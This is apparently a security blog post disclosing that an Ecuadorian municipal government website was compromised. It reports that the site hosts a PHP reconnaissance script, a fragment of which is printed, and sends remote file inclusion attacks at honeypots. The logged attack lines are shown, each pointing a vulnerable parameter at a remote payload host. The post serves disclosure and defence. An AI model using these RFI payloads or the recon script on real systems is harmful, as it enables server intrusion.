Ecuador Government site hacked and spreading malware

Colombia, Venezuela and now Ecuador. How far are we from reporting the whole South America? 🙂
The web site from the ‘Municipio del Cantón Mejía’ in Ecuador has been hosting malware and also attacking our honeypots for a while. As always, we reported and didn’t hear anything back.
They are hosting the common FX29ID php exploit:
http://www.municipiodemejia.gov.ec/administrator/components/com_search/sken/id1(feelcomz).txt
< ? php##[ Fxxxx ]##fx(“ID”,”FeeL”.”CoMz”);$P   = @getcwd();$IP  = @getenv(“SERVER_ADDR”);$UID = fx29exec(“id”);fx(“SAFE”,@safemode()?”ON”:”OFF”);fx(“OS”,@PHP_OS);fx(“UNAME”,@php_uname());fx(“SERVER”,($IP)?$IP:”-“);fx(“USER”,@get_current_user());fx(“UID”,($UID)?$UID:”uid=”.@getmyuid().” gid=”.@getmygid());fx(“DIR”,$P);fx(“PERM”,(@is_writable($P))?”[W]”:”[R]”);fx(“HDD”,”Used: “.hdd(“used”).” Free: “.hdd(“free”).” Total: “.hdd(“total”));fx(“DISFUNC”,@getdisfunc());##[ FX29SHEXEC ]##
Also attempting RFI attacks against our systems (190.152.217.250 is their IP address):
SCAN:190.152.217.250 /xxx/new-visitor.inc.php?lvc_include_dir=http://www.j8design.com/id1.txt?190.152.217.250 /xxx/show.php?path= http://kucing1.fileave.com/id1.txt?190.152.217.250 //?_SERVER[DOCUMENT_ROOT]= http://clompunk.webs.com/id1.txt?190.152.217.250 //bbs///skin/buzzard_espoon/setup.php?dir= http://www.hyonsvc.co.kr//bbs//icon/id1.txt????????190.152.217.250 //delete_comment.php?board_skin_path= http://www.hyonsvc.co.kr//bbs//icon/id1.txt
If you know anyone at the Ecuador .gov, let them know about it. Hopefully they will get it fixed soon.
